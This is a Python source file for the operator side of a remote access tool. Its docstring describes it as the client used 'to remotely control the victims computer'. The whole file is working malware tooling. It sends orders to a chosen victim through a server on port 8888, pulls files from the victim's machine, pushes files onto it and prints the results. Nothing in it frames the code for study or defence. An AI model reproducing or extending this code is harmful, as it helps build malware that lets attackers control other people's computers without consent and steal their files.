"""
The client interface for the remote acces service

this module is the one used by the clients to remotely control the victims computer
all instruccions are sent to the server and later executed on the victims computer

Typical usage example:

  order: $TARGET {target} <-- input the target of the order
  order: {order} <-- send the order to be executed
"""


from pynput import keyboard
from commun import client
from proc import client_processor
import time


def boot():
    comunicator = client('master', 'localhost', 8888, True)
    process_mangaer = client_processor()
    return comunicator, process_mangaer


def on_press(key):
    if key == keyboard.Key.esc:
        processor.message = '$STOP_LISTEN'
        com.send_message(processor.message, com.socket)
        processor.listen = False


listener = keyboard.Listener(
    on_press=on_press,)

listener.start()


def text_traffic():
    com.send_message(processor.message, com.socket)

    response = '00'
    while response is not None:
        response = com.receive_message(com.socket)

        if response is not None :
            print(response['msg'])


# unused pylint: disable=broad-except
def request_file():
    try:
        requested_name = processor.message['msg'].split(' ')[0]
        output_name = processor.message['msg'].split(' ')[1]
    except IndexError:
        print('invalid prompt, try (requested name : output name)')
        return

    processor.message = requested_name
    com.send_message(processor.message, com.socket)
    response = com.receive_message(com.socket)

    try:
        with open(output_name, 'wb') as file:
            file.write(response['msg'])
    except Exception as error:
        print(error)


def send_file():
    try:
        requested_name = processor.message['msg'].split(' ')[0]
        output_name = processor.message['msg'].split(' ')[1]
    except IndexError:
        print('invalid prompt, try (requested name : output name)')
        return
    processor.message = output_name
    com.send_message(processor.message, com.socket)
    try:
        with open(requested_name, 'rb') as file:
            bytes_to_send = file.read()
    except FileNotFoundError:
        print('file doesnt exist')
        return
    processor.message = bytes_to_send
    com.send_message(processor.message, com.socket)


def main() -> None:
    """
    the main flow of execution of the program.

    it first gets the message which is an {input} call stored
    in the processor as a the message atribute, it then looks
    for any keywords, if found it processes them, else it sends
    the message it colected.

    Two checks are put in place, the first one asserts whether the
    message is meant to be sent, the second one enshures a target has
    been set before sending the message

    Args:
        None
    Returns:
        None
    Raises:
        None
    """

    while True:
        processor.message = input('order:')

        processor.process_msg()
        if processor.tt_called:
            com.socket.settimeout(processor.tt_called)
            processor.tt_called = False
        if not processor.message_to_send:
            continue
        if not processor.flags or processor.flags['target'] == com.username:
            print('please set target using the "$TARGET" command')
            continue

        if processor.listen:
            com.send_message(processor.message, com.socket)
            while processor.listen:

                response = com.receive_message(com.socket)

                if response is not None and response['flags']['type'] != 'SPAM':
                    print(response['msg'])
            continue

        if processor.flags['type'] == 'REQUEST':
            request_file()
        elif processor.flags['type'] == 'SEND':
            send_file()
        else:
            text_traffic()


com, processor = boot()
main()
